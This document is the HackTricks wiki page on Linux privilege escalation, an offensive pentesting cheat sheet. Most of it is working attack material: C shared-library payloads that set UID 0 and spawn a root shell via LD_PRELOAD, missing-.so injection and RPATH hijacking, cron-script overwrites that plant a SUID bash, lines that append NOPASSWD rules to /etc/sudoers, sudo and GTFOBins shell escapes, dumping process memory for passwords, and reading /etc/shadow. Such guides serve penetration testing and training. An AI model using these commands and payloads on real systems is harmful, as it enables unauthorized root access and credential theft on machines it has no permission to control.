# Linux Privilege Escalation

Do you want to **know** about my **latest modifications**/**additions or you have any suggestion for HackTricks or PEASS**, **join the** [**PEASS & HackTricks telegram group here**](https://t.me/peass)**.**  
If you want to **share some tricks with the community** you can also submit **pull requests** to ****[**https://github.com/carlospolop/hacktricks**](https://github.com/carlospolop/hacktricks) ****that will be reflected in this book.  
Don't forget to **give ⭐ on the github** to motivate me to continue developing this book.

## Kernel exploits

Check the kernel version and if there is some exploit that can be used to escalate privileges

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

You can find a good vulnerable kernel list and some already **compiled exploits** here: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).  
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

To extract all the vulnerable kernel versions from that web you can do:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Tools that could help searching for kernel exploits are:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)  
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)  
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) \(execute IN victim,only checks exploits for kernel 2.x\)

Always **search the kernel version in Google**, maybe your kernel version is wrote in some kernel exploit and then you will be sure that this exploit is valid.

### CVE-2016-5195 \(DirtyCow\)

Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo version

Based on the vulnerable sudo versions that appear in:

```bash
searchsploit sudo
```

You can check if the sudo version is vulnerable using this grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

## Software exploits

Check for the **version of the installed packages and services**. Maybe there is some old Nagios version \(for example\) that could be exploited for gaining privileges…  
It is recommended to check manually the version of the more suspicious installed software.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

## Users

Check who you are, which privileges do you have, which users are in the systems, which ones can login and which ones have root privileges

```bash
id || (whoami && groups) 2>/dev/null #Me?
cat /etc/passwd | cut -d: -f1 #All users
cat /etc/passwd | grep "sh$" #Users with console
awk -F: '($3 == "0") {print}' /etc/passwd #Superusers
w #Currently login users
last | tail #Login history
```

### Big UID

Some Linux versions were affected by a bug that allow users with **UID &gt; INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74),  [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).  
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Known passwords

If you know any password of the environment try to login as each user using the password.

## Groups

Check if you are in some group that could grant you root rights:

{% page-ref page="interesting-groups-linux-pe/" %}

## Writable PATH abuses

### $PATH

If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user \(root ideally\) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.

## Services

### Writable _.service_ files

Check if you can write any `.service` file, if you can, you **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped** \(maybe you will need to wait until the machine is rebooted\).

### Writable service binaries

Keep in mid that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.

### systemd PATH - Relative Paths

You can see the PATH used by **systemd** with:

```bash
systemctl show-environment
```

If you find that you can **write** in any of the folders of the path you may be able to **escalate privileges**. You need to search for **relative paths being used on service configurations** files like:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Then, create a **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action \(**Start**, **Stop**, **Reload**\), your **backdoor will be executed** \(unprivileged users usually cannot start/stop services but check if you can using `sudo -l`\).

**Learn more about services with  `man systemd.service`.**

## **Timers**

**Timers** are systemd unit files whose name ends in . **timer** that control . service files or events. **Timers** can be used as an alternative to cron. **Timers** have built-in support for calendar time events, monotonic time events, and can be run asynchronously.

You can enumerate all the timers doing:

```bash
systemctl list-timers --all
```

### Writable timers

If you can modify a timer you can make it execute some existent systemd.unit \(like a `.service` or a `.target`\)

```bash
Unit=backdoor.service
```

In the documentation you can read what the Unit is:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. \(See above.\) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Therefore, in order to abuse this permissions you would need to:

* find some systemd unit \(like a `.service`\) that is **executing a writable binary**
* Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** \(to impersonate that executable\)

**Learn more about timers with  `man systemd.timer`.**

### **Enabling Timer**

In order to enable a timer you need  root privileges and to execute: 

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

In brief, a Unix Socket \(technically, the correct name is Unix domain socket, **UDS**\) allows **communication between two different processes** on either the same machine or different machines in client-server application frameworks. To be more precise, it’s a way of communicating among computers using a standard Unix descriptors file. \(From [here](https://www.linux.com/news/what-socket/)\).

Sockets can be configured using `.socket` files.

**Learn more about sockets with  `man systemd.socket`.** Inside this file some several interesting parameters can be configured:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: This options are different but as summary as used to **indicate where is going to listen** the socket \(the path of the AF\_UNIX socket file, the IPv4/6 and/or port number to listen...\).
* `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
* `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
* `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket \(with the suffix replaced\). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the begging of the `[Socket]` section something like:  `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**  
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** \(_now where are talking about Unix Sockets, not about the config `.socket` files_\), then, **you can communicate** with that socket and maybe exploit a vulnerability.

### HTTP sockets

Note that there may be some **sockets listening for HTTP** requests \(_I'm not talking about .socket files but about the files acting as unix sockets_\). You can check this with:

```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```

If the socket **respond with a HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.

## **D-Bus**

D-BUS is an **inter-process communication \(IPC\) system**, providing a simple yet powerful mechanism **allowing applications to talk to one another**, communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system.

D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think **UNIX domain sockets on steroids**. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth dæmon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. ****\(From [here](https://www.linuxjournal.com/article/7744)\).

D-Bus use an **allow/deny model**, where each message \(method call, signal emission, etc.\) can be **allowed or denied** according to the sum of all policy rules which match it. Each  or  rule in the policy should have the `own`, `send_destination` or `receive_sender` attribute set.

Part of the policy of `/etc/dbus-1/system.d/wpa_supplicant.conf`:

```markup
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

Therefore, if a policy is allowing your user in anyway to **interact with the bus**, you could be able to exploit it to escalate privileges \(maybe just listing for some passwords?\).

Note that a **policy** that **doesn't specify** any user or group affects everyone \(`<policy>`\).  
Policies to the context "default" affects everyone not affected by other policies \(`<policy context="default"`\).

**Learn how to enumerate and exploit a D-Bus communication here:**

{% page-ref page="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}

## Processes

Take a look to what processes are being executed and check if any process has more privileges that it should \(maybe a tomcat being executed by root?\)

```bash
ps aux
ps -ef
top -n 1
```

### Process memory

Some services of a server save **credentials in clear text inside the memory**. If you have access to the memory of a FTP service \(for example\) you could get the Heap and search inside of it the credentials.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### /proc/$pid/maps &  /proc/$pid/mem

For a given process ID, **maps shows how memory is mapped within that processes'** virtual address space; it also shows the **permissions of each mapped region**. The **mem** psuedo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.

To dump a process memory you could use:

* [https://github.com/hajzer/bash-memory-dump](https://github.com/hajzer/bash-memory-dump) \(root is required\)
* Script A.5 from [https://www.delaat.net/rp/2016-2017/p97/report.pdf](https://www.delaat.net/rp/2016-2017/p97/report.pdf) \(root is required\)



```text
strings /dev/mem -n10 | grep -i PASS
```

## Scheduled jobs

Check if any scheduled job has any type of vulnerability. Maybe you can take advantage of any script that root executes sometimes \(wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?\).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

### Example: Cron path

For example, inside _/etc/crontab_ you can find the sentence: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_

Then, you can get a root shell by using:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait 1 min
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Example: Cron using a script with a wildcard \(Wildcard Injection\)

If a script being executed by root has an “**\***” inside a command, you could exploit this to make unexpected things \(like privesc\). Example:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**The wildcard cannot be preceded of a path:** _**/some/path/\***_ **is not vulnerable \(even** _**./\***_ **is not\)**

\*\*\*\*[**Read this for more Wildcards spare tricks**](wildcards-spare-tricks.md)

### Example: Cron script overwriting and symlink

If you can write inside a cron script executed by root, you can get a shell very easily:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

If the script executed by root uses somehow a directory in which you have full access, maybe it could be useful to delete that folder and create a symlink folder to another one

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Frequent cron jobs

You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and deleting the commands that have beeing executed all the time, you can do:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

You could also use [pspy](https://github.com/DominicBreuker/pspy/releases) \(this will monitor every started process\).

## Commands with sudo and suid commands

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Some **unexpected commands allows you to read and/or write files or even execute command.** For example:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.

```text
$ sudo -l

User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.

```text
sudo vim -c '!sh'
```

### Sudo execution bypassing paths

**Jump** to read other files or use **symlinks**. For example in sudeores file: _hacker10 ALL= \(root\) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

If a **wilcard** is used \(\*\), it is even easier:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= \(root\) less_ you can exploit it by changing the PATH variable

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

This technique can also be used if a **suid** binary **executes another command without specifying the path to it \(always check with** _**strings**_ **the content of a weird SUID binary\)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

If the **suid** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the suid file is calling.

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Then, when you call the suid binary, this function will be executed

### LD\_PRELOAD

**LD\_PRELOAD** is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library \(libc.so\) This is called preloading a library.

To avoid this mechanism being used as an attack vector for _suid/sgid_ executable binaries, the loader ignores _LD\_PRELOAD_ if _ruid != euid_. For such binaries, only libraries in standard paths that are also _suid/sgid_ will be preloaded.

If you find inside the output of **`sudo -l`** the sentence: _**env\_keep+=LD\_PRELOAD**_ and you can call some command with sudo, you can escalate privileges.

```text
Defaults        env_keep += LD_PRELOAD
```

Save as **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Then **compile it** using:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finally, **escalate privileges** running

```bash
sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo
```

### SUID Binary – so injection

If you find some weird binary with **SUID** permissions, you could check if all the **.so** files are **loaded correctly**. In order to do so you can execute:

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

For example, if you find something like: _pen\(“/home/user/.config/libcalc.so”, O\_RDONLY\) = -1 ENOENT \(No such file or directory\)_ you can exploit it.

Create the file _/home/user/.config/libcalc.c_ with the code:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Compile it using:

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

And execute the binary.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit  
> sudo mysql -e '! /bin/sh'  
> strace -o /dev/null /bin/sh  
> sudo awk 'BEGIN {system\("/bin/sh"\)}'

{% embed url="https://gtfobins.github.io/" %}

### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. This files **by default can only be read by user root and group root**.  
**If** you can **read** this file you could be able to **obtain some interesting information**, and if you can **write** any file you will be able to **escalate privileges**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

If you can write you can abuse this permissions

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

### /etc/ld.so.conf.d/

If you can create a file in `/etc/ld.so.conf.d/` and you can execute **`ldconfig`**with root privileges \(sudo or suid\) then you can **make executable load arbitrary libraries**. 

For example, to make executables in that system load libraries from _/tmp_ you can **create** in that folder a **config file** \(_test.conf_\) pointing to _/tmp_:

{% code title="/etc/ld.so.conf.d/test.conf" %}
```bash
/tmp
```
{% endcode %}

And when executing **`ldconfig`**all the **binaries inside the system will be able to load libraries** from _/tmp_.  
So if there is a **binary** that **executes** a function called **`seclogin()`** from a **library** called **`libseclogin.so`** , you can create a backdoor in _/tmp_ and impersonate that libraries with that function:

{% code title="/tmp/libseclogin.so" %}
```c
#include <stdio.h>
//To compile: gcc -fPIC -shared -o libseclogin.so exploit.c
seclogin() {
    setgid(0); setuid(0);
    system("/bin/bash");
}
```
{% endcode %}

Note in the next image that \(_having already created the backdoor on /tmp_\) having the config file in _/etc/ld.so.conf.d_ pointing to _/tmp_ after using `ldconfig` the executable `myexec`stops loading the library from `/usr/lib` and loads it from _/tmp_:

![](../../.gitbook/assets/image%20%28101%29.png)

_This example was taken from the HTB machine: Dab._

### DOAS

There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`

```text
permit nopass demo as root cmd vim
```

## Shared Library

#### ldconfig

Identify shared libraries with `ldd`

```text
$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
```

Create a library in `/tmp` and activate the path.

```text
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
```

#### RPATH

```text
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.

```text
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```text
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

[Capabilities](https://www.insecure.ws/linux/getcap_setcap.html) are a little obscure but similar in principle to SUID. Linux’s thread/process privilege checking is based on capabilities: flags to the thread that indicate what kind of additional privileges they’re allowed to use. By default, root has all of them.

| Capabilities name | Description |
| :--- | :--- |
| CAP\_AUDIT\_CONTROL | Allow to enable/disable kernel auditing |
| CAP\_AUDIT\_WRITE | Helps to write records to kernel auditing log |
| CAP\_BLOCK\_SUSPEND | This feature can block system suspends |
| **CAP\_CHOWN** | Allow user to make arbitrary change to files UIDs and GIDs \(full filesystem access\) |
| **CAP\_DAC\_OVERRIDE** | This helps to bypass file read, write and execute permission checks \(full filesystem access\) |
| **CAP\_DAC\_READ\_SEARCH** | This only bypass file and directory read/execute permission checks |
| CAP\_FOWNER | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
| CAP\_KILL | Allow the sending of signals to processes belonging to others |
| CAP\_SETGID | Allow changing of the GID |
| **CAP\_SETUID** | Allow changing of the UID \(set UID of root in you process\) |
| CAP\_SETPCAP | Helps to transferring and removal of current set to any PID |
| CAP\_IPC\_LOCK | This helps to lock memory |
| CAP\_MAC\_ADMIN | Allow MAC configuration or state changes |
| CAP\_NET\_RAW | Use RAW and PACKET sockets |
| CAP\_NET\_BIND\_SERVICE | SERVICE Bind a socket to internet domain privileged ports |
| CAP\_SYS\_CHROOT | Ability to call chroot\(\) |

Capabilities are useful when you want to restrict your own processes after performing privileged operations \(e.g. after setting up chroot and binding to a socket\). However, they can be exploited by passing them malicious commands or arguments which are then run as root.

You can force capabilities upon programs using `setcap`, and query these using `getcap`:

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

The `+ep` means you’re adding the capability \(“-” would remove it\) as Effective and Permitted.

To identify programs in a system or folder with capabilities:

```bash
getcap -r / 2>/dev/null
```

### Exploitation example

In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep

#Exploit
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

### The special case of "empty" capabilities

Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no capabilities to that process. Or, simply put, if you have a binary that:

1. is not owned by root
2. has no `SUID`/`SGID` bits set
3. has empty capabilities set \(e.g.: `getcap myelf` returns `myelf =ep`\)

then that binary will run as root.

Capabilities info was extracted from [here](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)

## Open shell sessions

Maybe you have access to some root unprotected shell session.

### screen sessions

**List screen sessions**

```bash
screen -ls 
```

![](../../.gitbook/assets/image%20%28327%29.png)

**Attach to a session**

```bash
screen -dr <session> #The -d is to detacche whoeevr is attached to it
screen -dr 3350.foo #In the example of the image
```

### tmux sessions

**List tmux sessions** 

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![](../../.gitbook/assets/image%20%28126%29.png)

**Attach to a session**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the sessinos from the other console and then access it yourself
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian-based systems \(Ubuntu, Kubuntu, etc\) between September 2006 and May 13th, 2008 may be affected by this bug.  
This bug caused that when creating in those OS a new ssh key **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

* **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
* **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
* **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

#### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

* `yes` : root can login using password and private key
* `without-password` or `prohibit-password`: root can only login with private key
* `forced-commands-only`: Root can login only using privatekey cand if the commands options is specified
* `no` : no

#### AuthorizedKeysFile

Specifies files that contains the public keys that can be used for user authentication. I can contains tokens like `%h` , that will be replaced by the home directory. **You can indicate absolute paths** \(starting in `/`\) or **relative paths from the users home**. For example:

```bash
AuthorizedKeysFile	.ssh/authorized_keys access
```

That configuration will indicate that if you try to login with the **private** key ****of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

#### ForwardAgent/AllowAgentForwarding

SSH agent forwarding allows you to **use your local SSH keys instead of leaving keys** \(without passphrases!\) sitting on your server. So, you will be able to **jump** via ssh **to a host** and from there **jump to another** host **using** the **key** located in your **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:

```text
Host example.com
  ForwardAgent yes
```

Notice that if `Host` is `*` every time the user jumps to a different machine that host will be able to access the keys \(which is a security issue\).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.  
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` \(default is allow\).

If you Forward Agent configured in an environment ****[**check here how to exploit it to escalate privileges**](ssh-forward-agent-exploitation.md).

## Read sensitive data

Check if you can read some sensitive files and what is contained in some folders. For example:

* `cat /etc/shadow` This is the file that contains password hashes
* `cat /etc/security/opasswd` This file may contain password hashes history
* `cat /etc/passwd` In some cases this file may contain hashes of passwords

Check the contents of **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports**

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/
```

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
fils=`find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null`Hidden files
```

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Web files**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Backups**

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/nulll
```

### Known files containing passwords

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), it searches for several possible files that could contain passwords.

Other interesting tool that you can use to do so is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)\*\*\*\*

### R**egexp** or **strings** inside files \(It could be also useful to check [**log files**](https://www.thegeekstuff.com/2011/08/linux-var-log-files/)\)

```bash
grep -lRi "password" /home /var/www /var/log 2>/dev/null | sort | uniq #Find string password (no cs) in those directories
grep -a -R -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /var/log/ 2>/dev/null | sort | uniq #IPs inside logs
```

### E**nvironment**, there could be interesting data

```text
set
env
cat /proc/self/environ
```

## Writable files

You should check if you can **write in some sensitive file**. For example, can you write to some **service configuration file**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

